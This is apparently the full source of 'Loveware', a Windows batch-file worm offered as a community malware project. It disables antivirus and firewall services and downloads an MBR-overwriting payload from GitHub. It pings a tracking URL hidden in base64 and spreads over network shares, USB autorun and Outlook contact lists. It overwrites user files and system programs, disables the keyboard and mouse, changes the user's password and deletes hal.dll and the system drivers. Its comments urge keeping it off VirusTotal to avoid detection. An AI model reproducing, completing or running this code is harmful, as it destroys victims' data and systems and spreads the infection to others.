@echo off

:: THIS VERSION CAN CONTAIN BUGS
::
:: LOVEWARE v9.4
::
::
:: Name: Loveware
:: Creator: Da2dalus
:: What is this in gods name?!:
:: This is a worm that will mess up your computer!
:: BTW It is community driven!!! :)
::  ____________________________________________________
:: |___________________MALWARE CLASS____________________|
:: |TYPE______|ANSWER___________________________________|
:: |LOVELETTER|YES THIS IS A LOVELETTER BASED SOFTWARE  |
:: |Spyware   |NO                                       |
:: |Trojan    |YOU CAN CHOOSE                           |
:: |Email worm|YES                                      |
:: |Net worm  |YES                                      |
:: |XSS worm  |NOT THERE YET ;)                         |
:: |Adware    |NO                                       |
:: |RAT       |I AM NOT SO BAD                          |
:: |Backdoor  |PROBABLY NOT ;) (NO)                     |
:: |YOUR DOOM!|DEFINETLY!!!!!!!!!!                      |
::
:: IF YOU FIX A BUG OR ADD SOMETHING NEW TO THE SOFTWARE 
:: YOUR NAME WILL APPEAR HERE:
::  ______________________________
:: |MEMBERS_______________________|
:: |Da2dalus__________|CREATOR____|
:: |a11y-spec_________|CONTRIBUTOR|
:: |__________________|___________|
:: |__________________|___________|
:: |__________________|___________|
:: 
:: Notes:
:: This software needs to be converted to exe
:: (add "invisible startup for better preformance").
:: Please send me a message on github or in the Issuses tab of this repo on github
:: https://github.com/Da2dalus/Loveware
:: if you find any bugs or if you have
:: a good idea about something we can add to this software.
:: Disclamer:
:: I am not responsible for the damage caused by this software.
::
::    ,--,                                                                           
::  ,---.'|                                                                           
::  |   | :                                                                           
::  :   : |                                                                           
::  |   ' :      ,---.                              .---.             __  ,-.         
::  ;   ; '     '   ,'\      .---.                 /. ./|           ,' ,'/ /|         
::  '   | |__  /   /   |   /.  ./|  ,---.       .-'-. ' |  ,--.--.  '  | |' | ,---.   
::  |   | :.'|.   ; ,. : .-' . ' | /     \     /___/ \: | /       \ |  |   ,'/     \  
::  '   :    ;'   | |: :/___/ \: |/    /  | .-'.. '   ' ..--.  .-. |'  :  / /    /  | 
::  |   |  ./ '   | .; :.   \  ' .    ' / |/___/ \:     ' \__\/: . .|  | ' .    ' / | 
::  ;   : ;   |   :    | \   \   '   ;   /|.   \  ' .\    ," .--.; |;  : | '   ;   /| 
::  |   ,/     \   \  /   \   \  '   |  / | \   \   ' \ |/  /  ,.  ||  , ; '   |  / | 
::  '---'       `----'     \   \ |   :    |  \   \  |--";  :   .'   \---'  |   :    | 
::                          '---" \   \  /    \   \ |   |  ,     .-./       \   \  /  
::                                 `----'      '---"     `--`---'            `---  
:: DO NOT UPLOAD ON VIRUSTOTAL!!!
::                                                                         

color 57

title Loveware

:: Detect if program is running in virtualmachine

FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
SET check=%%F
)
echo %check%

if %check% == False (
    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
    echo BtnCode = WshShell.Popup("Could not start process!",2+48,"Taskmanager")>>C:\Windows\ifvm.vbs
    echo Select Case BtnCode>>C:\Windows\ifvm.vbs
    echo case 3 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 4 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 5 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo End Select>>C:\Windows\ifvm.vbs
    start C:\Windows\ifvm.vbs
    pause
    exit
) else (
    goto valentine

:: Do not run on valentine function

:valentine

for /f "skip=1" %%x in ('wmic os get localdatetime') do if not defined MyDate set MyDate=%%x
for /f %%x in ('wmic path win32_localtime get /format:list ^| findstr "="') do set %%x

set today=%Year%

for /f "delims=" %%a in ('c:\date.exe +%%w') do set DayOfWeek=%%a
if %DayOfWeek% == 14-02-%Year% (
    msg * Happy Valentine!!!
    pause
    exit
) else (
    goto :admin
)

:: Only run as admin function

:admin

net session >nul 2>&1

if %errorLevel% == 0 (
    goto runner
) else (
    echo msgbox("Please run as admin",0+64,"Admin") > C:\Windows\Admin.vbs
    start C:\Windows\Admin.vbs
    pause
    exit
)

:runner

:: Disable antivirus, firewall, taskmanager...

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess

del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*

:: Change file name to Loveware

RENAME %0 Loveware.exe

:: Move Loveware to the windows directory

MOVE /e /y Loveware.exe C:\Windows

:: Download file that will overwrite the mbr

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe', 'SomeHugs.exe')"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe -OutFile SomeHugs.exe"

:: Copy SomeHugs.exe to the startup folder to prevent
:: people from escaping death.

XCOPY "%USERPROFILE%\Downloads\SomeHugs.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Goto canarytoken link that will add the infected by Loveware user to the Loveware Infected map.
:: Loveware infected map: https://canarytokens.org/manage?token=h8blu81q8j2vzu825fmpzut7r&auth=e8be20c708872b669cd4562d35b5abf7

PowerShell.exe -command "Set-ExecutionPolicy Unrestricted"

echo set "base64string=c3RhcnQgL21pbiBodHRwOi8vY2FuYXJ5dG9rZW5zLmNvbS90YWdzL3Rlcm1zL2g4Ymx1ODFxOGoydnp1ODI1Zm1wenV0N3IvY29udGFjdC5waHA=">>Canary.ps1
echo for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#">>Canary.ps1

echo echo %decoded% | Out-File -FilePath C:\Windows\Canary.bat -Force>>Canary.ps1

start /min Canary.ps1

timeout 8

start /min Canary.bat

:: Copy Loveware to the startup

XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Infect network connected computers

@echo off > service.bat
SET "NomeProcesso=Loveware.exe" >> service.bat
SET "NomeService=Loveware" >> service.bat
echo sc create %NomeService% binpath=%0 >> service.bat
echo sc start %NomeService% >> service.bat

attrib +h +r +s service.bat
start service.bat

SET i=0

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0

:Internet
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto worm
goto Internet

:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.exe)
for /f %%f in ('dir C:\Users\*.exe /s /b') do (copy %0 %%f)
goto Infect

:: Send Loveware to all the contacts of the user
:: with outlook

:worm

set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=Loveware
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
set b=Loveware
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"

goto run2

goto worm

:: Infect autoexec.bat

:run2

set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=Loveware
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
set b=Loveware
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini

:: Delete all files in externall flash drives

del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q

:: Create autorun file

echo [autorun] > windows.inf
echo ;open=Loveware.exe >> windows.inf
echo ShellExecute=Loveware.exe >> windows.inf
echo UseAutoPlay=1 >> windows.inf

:: Copy windows.inf to usb

xcopy /e /y windows.inf D:\
xcopy /e /y windows.inf E:\
xcopy /e /y windows.inf F:\
xcopy /e /y windows.inf G:\
xcopy /e /y windows.inf H:\

:: Copy loveware to usb drives

xcopy /e /y Loveware.exe D:\
xcopy /e /y Loveware.exe E:\
xcopy /e /y Loveware.exe F:\
xcopy /e /y Loveware.exe G:\
xcopy /e /y Loveware.exe H:\

:: Use KaZaa to spread if the user has this ancient stuff

if exist C:\Program Files\KaZaa\My Shared Folder\ (
    xcopy Loveware.exe C:\Program Files\KaZaa\My Shared Folder\list.doc.exe
    goto key
) else (
    goto key
)

:key

:: Keyboard reg

echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"

echo :a > explorer.bat
echo tskill explorer >> explorer.bat
echo goto a >> explorer.bat

echo Set objShell = CreateObject("WScript.Shell") > invisi.vbs
echo strCommand = "explorer.bat" >> invisi.vbs
echo objShell.Run strCommand, vbHide, TRUE >> invisi.vbs

:: Infect different files: lnk, mp3, doc, pdf....

assoc .lnk=batfile
DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"

assoc .doc=batfile
DIR /S/B %SystemDrive%\*.doc >> InfList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_doc.txt) do copy /y %0 "%%j:%%k"

assoc .txt=batfile
DIR /S/B %SystemDrive%\*.txt >> InfList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_txt.txt) do copy /y %0 "%%j:%%k"

assoc .pdf=batfile
DIR /S/B %SystemDrive%\*.pdf >> InfList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_pdf.txt) do copy /y %0 "%%j:%%k"

assoc .xml=batfile
DIR /S/B %SystemDrive%\*.xml >> InfList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_xml.txt) do copy /y %0 "%%j:%%k"

assoc .mp3=batfile
DIR /S/B %SystemDrive%\*.mp3 >> InfList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp3.txt) do copy /y %0 "%%j:%%k"

assoc .mp4=batfile
DIR /S/B %SystemDrive%\*.mp4 >> InfList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp4.txt) do copy /y %0 "%%j:%%k"

assoc .png=batfile
DIR /S/B %SystemDrive%\*.png >> InfList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_png.txt) do copy /y %0 "%%j:%%k"

:: Send message to other users

:haha
msg * "I Love You!"
net send * "I Love You"
goto run3
goto haha

:run3

:: Download Mouse mover by Npocmaka so we can have some fun with the cursor. Npocmaka's repository:
:: https://github.com/npocmaka/batch.scripts

powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.bat')"
powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file -OutFile mouse.bat"

:: Overwrite some programs and taskmanager for extra fun

tskill pbrush
copy /y Loveware.exe C:\Windows\pbrush.exe

tskill excel
copy /y Loveware.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\EXCEL.EXE"

tskill mspaint
copy /y Loveware.exe "%windir%\system32\mspaint.exe"

tskill WINWORD
copy /y Loveware.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\WINWORD.EXE"

tskill calc
copy /y Loveware.exe "%windir%\system32\calc.exe

tskill msaccess
copy /y Loveware.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\MSACCESS.EXE"

tskill iexplore
copy /y Loveware.exe "C:\Program Files\Internet Explorer\iexplore.exe"

tskill safari
copy /y Loveware.exe "C:\Program Files\Safari\Safari.exe"

:: Create new vbs file that speaks.

echo do > speak.vbs
echo CreateObject(“SAPI.SpVoice”).Speak”I love YOU” >> speak.vbs
echo loop >> speak.vbs

:: Create the final payload "LoveChoice"

echo @echo off > LoveChoice.bat
echo color 57 >> LoveChoice.bat
echo title LoveChoice >> LoveChoice.bat

echo set z=%random% > yes.bat
echo set z=%random% > no.bat

:: make LoveChoice unclosable

echo :checker >> LoveChoice.bat

echo goto lovechoice >> LoveChoice.bat

echo if "%1" equ "Restarted" goto %1 >> LoveChoice.bat

echo :again >> LoveChoice.bat
echo echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL >> LoveChoice.bat
echo goto :again >> LoveChoice.bat

echo :Restarted >> LoveChoice.bat
echo goto checker >> LoveChoice.bat

echo :lovechoice >> LoveChoice.bat

:: Choose how you want to die

echo echo Hey, do you love me (only answer in yes or no) >> LoveChoice.bat

echo set /p love= >> LoveChoice.bat
echo if %love%==yes goto love >> LoveChoice.bat
echo if %love%==no goto hate >> LoveChoice.bat

:: First choice

echo :love>>LoveChoice.bat

echo echo I love you too...>>LoveChoice.bat

:: Create a little message

echo @echo @echo off > AUTOEXEC.BAT >> yes.bat
echo @echo I hope you listerned to my warning! >> AUTOEXEC.BAT >> yes.bat
echo @echo timeout 20 >> AUTOEXEC.BAT >> yes.bat
echo @echo exit >> AUTOEXEC.BAT >> yes.bat

echo echo I will give you a present because you love me... >> LoveChoise.bat
echo echo But first I want to say... >> LoveChoice.bat
echo echo ........ >> LoveChoice.bat
echo echo ..... >> LoveChoice.bat
echo echo You are hacked my love!!! >> LoveChoice.bat
echo echo info: This software was made by Da2dalus! >> LoveChoice.bat
echo echo I am not responsible for the damage. Sorry if U are a victim of this trojan. >> LoveChoice.bat
echo echo Do not close Loveware or Lovewatch, this will kill your computer! >> LoveChoice.bat
echo echo If you restart your computer now you wont be able to use it. >> LoveChoice.bat
echo echo You will get a message when you can safely restart or reboot your computer. >> LoveChoice.bat

echo timeout 5 >> LoveChoice.bat

echo echo But first I want to have some fun! >> LoveChoice.bat
echo echo Hahahahahahahaha!!!!!!! >> LoveChoice.bat

:: Start the fun

echo start yes.vbs >> LoveChoice.bat

echo :respawn >> yes.bat
echo start Loveware.exe >> yes.bat
echo goto crazymouse >> yes.bat
echo goto respawn >> yes.bat

:: Crazy mouse

echo :crazymouse >> yes.bat
echo goto chaos >> yes.bat
echo call mouse.exe moveBy 10x100 >> yes.bat
echo call mouse.exe moveBy 16x50 >> yes.bat
echo call mouse.exe moveBy 190x10 >> yes.bat
echo call mouse.exe moveBy 186x50 >> yes.bat
echo goto crazymouse >> yes.bat

:: Create some chaos

echo :chaos >> yes.bat
echo start speak.vbs >> yes.bat
echo date 14/02/2006 >> yes.bat
echo time 00:00:00 >> yes.bat
echo nul >> %random% >> yes.bat
echo mkdir ILoveYou+%z% >> yes.bat
echo net user lover+%z% /add >> yes.bat
echo goto makemsg >> yes.bat
echo goto chaos >> yes.bat

:: A little message from your lover

echo :makemsg >> yes.bat
echo echo do > msg.vbs >> yes.bat
echo echo Msgbox"I love you darling.....",0+0,"You are hacked!" >> msg.vbs >> yes.bat
echo echo loop>>msg.vbs >> yes.bat
echo goto startmsg >> yes.bat
echo goto makemsg >> yes.bat

echo :startmsg >> yes.bat
echo start msg.vbs >> yes.bat
echo goto run >> yes.bat
echo goto startmsg >> yes.bat

:: Create a new file and print it with the pritner

echo :run>>yes.bat
echo echo I love you!!!>>LOVE.txt>>yes.bat

echo :Print >> yes.bat
echo PRINT LOVE.txt /D:LPT2 >> yes.bat
echo PRINT LOVE.txt /D:LPT1 >> yes.bat
echo NOTEPAD /P LOVE.txt >> yes.bat
echo goto run1 >> yes.bat
echo goto Print >> yes.bat

:: Disable keyboard

echo :run1 >> yes.bat

echo start "nokeyboard.reg" >> yes.bat

:: Rename desktop files

echo CD Desktop >> yes.bat
echo ren *.png LOVE.Letter >> yes.bat
echo ren *.jpg LOVE.Letter >> yes.bat
echo ren *.gif LOVE.Letter >> yes.bat
echo ren *.docx LOVE.Letter >> yes.bat
echo ren *.doc LOVE.Letter >> yes.bat
echo ren *.pdf LOVE.Letter >> yes.bat

:: Delete mouse

echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass" >> yes.bat
echo reg delete %key% >> yes.bat
echo reg add %key% /v Start /t REG_DWORD /d 4 >> yes.bat

:: Overwrite regedit to make it harder for the poor guy

echo copy /y Loveware.exe C:\Windows\regedit.exe >> yes.bat

echo timeout 400 >> yes.bat

:: Have mersy and let the guy live

echo @echo off > clean.bat
echo echo Starting Clean Up Process!!!! >> LoveChoice.bat

echo :clean >> clean.bat
echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe" >> clean.bat

echo cls >> LoveChoice.bat

echo echo Starting the Clean up process. You are soon going to be free >> LoveChoice.bat

echo start /min clean.bat

echo timeout 10 >> LoveChoice.bat

echo cls >> LoveChoice.bat

echo echo Now it is safe to reboot your computer! >> LoveChoice.bat
echo echo Thank you for downloading my project and testing it. >> LoveChoice.bat

echo pause >> LoveChoice.bat

shutdown /s >> LoveChoice.bat
echo exit >> LoveChoice.bat

:: Second choice (not a good one :) )

echo :hate >> LoveChoice.bat
echo echo But I love you....hehehehehe :( >> LoveChoice.bat

:: Crazy mouse

echo :crazymousee >> LoveChoice.bat
echo goto run4 >> LoveChoice.bat
echo @call mouse moveBy 10x100 >> LoveChoice.bat
echo @call mouse moveBy 16x50 >> LoveChoice.bat
echo @call mouse moveBy 190x10 >> LoveChoice.bat
echo @call mouse moveBy 186x50 >> LoveChoice.bat
echo goto crazymousee >> LoveChoice.bat

echo :run4 >> LoveChoice.bat

echo echo ...... >> LoveChoice.bat

:: Dudley trojan with message

echo @echo @echo off > AUTOEXEC.BAT >> LoveChoice.bat
echo @echo echo Loveware was here... >> AUTOEXEC.BAT >> LoveChoice.bat
echo @echo :l >> AUTOEXEC.BAT >> LoveChoice.bat
echo @echo goto l >> AUTOEXEC.BAT >> LoveChoice.bat

echo echo .......... >> LoveChoice.bat
echo echo You are hacked!!! >> LoveChoice.bat
echo echo Info: This trojan was created by Da2dalus! >> LoveChoice.bat
echo timeout 1 >> LoveChoice.bat
echo echo You do not have so mutch time left to live!!!!!!!!!!!!!!!!!!!!! >> LoveChoice.bat
echo echo So use your computer as long as you can!!!!!!!!!!!! >> LoveChoice.bat
echo echo Do not close Loveware or LoveChoice, this will kill your computer!!!!!!! >> LoveChoice.bat

:: Having some fun

echo start no.vbs >> LoveChoice.bat

echo :loop>>no.bat
echo start Loveware.exe >> no.bat
echo goto run5 >> no.bat
echo goto loop >> no.bat

echo :run5 >> no.bat

:: An angry message :)

echo :run6 >> no.bat

echo :msgbox >> no.bat
echo echo do > msg.vbs >> no.bat
echo echo Msgbox"I hate you... Here is the payback for the things you did to me!",0+0,"You are hacked!">>msg.vbs>>no.bat
echo echo loop>>msg.vbs>>no.bat
echo goto msginf>>no.bat
echo goto msgbox>>no.bat

echo :msginf>>no.bat
echo start msg.vbs>>no.bat
echo goto dangerouschaos>>no.bat
echo goto msginf>>no.bat

:: Making your pc unusable

echo :dangerouschaos>>no.bat
echo net user %username% a0h5UILOVEYOUuYR45JmyUtHAHAHAHAHTheG0df@ther!>>no.bat
echo date 14/02/2006>>no.bat
echo time 00:00:00>>no.bat
echo nul >> %random%>>no.bat
echo mkdir IhateYou+%z%>>no.bat
echo net user lover+%z% /add>>no.bat
echo goto run7>>no.bat
echo goto dangerouschaos>>no.bat

:: Create a new file and print it with the pritner

echo :run7>>no.bat

echo echo I hate you!!!>>LOVE.txt>>no.bat

echo :print>>no.bat
echo PRINT LOVE.txt /D:LPT2>>no.bat
echo PRINT LOVE.txt /D:LPT1>>no.bat
echo NOTEPAD /P LOVE.txt>>no.bat
echo goto run8>>no.bat
echo goto print>>no.bat

echo :run8>>no.bat

:: Disable keyboard

echo start "nokeyboard.reg">>no.bat

:: Rename files on desktop

echo CD Desktop>>LoveChoice.bat
echo ren *.png LOVE.Letter>>no.bat
echo ren *.jpg LOVE.Letter>>no.bat
echo ren *.gif LOVE.Letter>>no.bat
echo ren *.docx LOVE.Letter>>no.bat
echo ren *.doc LOVE.Letter>>no.bat
echo ren *.pdf LOVE.Letter>>no.bat

:: Overwrite regedit to make it harder for the poor guy

echo copy/y Loveware.exe C:\Windows\regedit.exe>>yes.bat

echo timeout 400 >> no.bat

:: Kill explorer

echo start "" invisi.vbs >> no.bat

:: Just killing you

echo start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe >> no.bat
echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll" >> no.bat
echo @((( Echo Off > Nul ) & Break Off ) >> no.bat
echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run >> no.bat
echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul >> no.bat
echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*" >> no.bat
echo )>>no.bat
echo shutdown /s>>no.bat

echo CreateObject("Wscript.Shell").Run "C:\Windows\yes.vbs" & WScript.Arguments(0) & "C:\Windows\yes.bat", 0, False>yes.vbs
echo CreateObject("Wscript.Shell").Run "C:\Windows\no.vbs" & WScript.Arguments(0) & "C:\Windows\no.bat", 0, False>no.vbs

:: Start the payload (LoveChoice)

start LoveChoice.bat

:: Put on some music

start /min https://www.youtube.com/watch?v=XpqqjU7u5Yc

:: Restart LoveChoice if someone closes it

:checker

if "%1" equ "Restarted" goto %1

:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
goto checker


::       .....           .....
::   ,ad8PPPP88b,     ,d88PPPP8ba,
::  d8P"      "Y8b, ,d8P"      "Y8b
:: dP'           "8a8"           `Yd
:: 8(              "              )8
:: I8       CODED WITH LOVE       8I
::  Yb,     BY THE LOVEWARE     ,dP
::   "8a,        TEAM         ,a8"
::     "8a,                 ,a8"
::       "Yba             adP"
::         `Y8a         a8P'
::           `88,     ,88'
::             "8b   d8"
::              "8b d8"
::               `888'
::                 "
::
::
:: PLEASE DO NOT COPY THE LOVEWARE CODE AND RENAME IT
:: THAT'S NOT CREATING THAT IS STEALING.
:: THIS SOFTWARE IS PROTECTED BY A GNU PUBLIC LICENSE
:: DO NOT UPLOAD THIS SAMPLE ON VIRUS TOTAL TO PREVENT 
:: ANTI VIRUS DETECTION.
:: I AND THE TEAM ARE NOT RESPONSIBLE FOR THE DAMAGE CAUSED BY 
:: THIS SOFTWARE!
::
:: THANKS FOR THE PEOPLE WHO ADDET THERE CODE TO THIS PROJECT
:: AND SUPPORTED IT
::
:: NEW VERSIONS WILL BE COMING SOON (I HOPE)
::
:: Greetings from the LOVEWARE TEAM
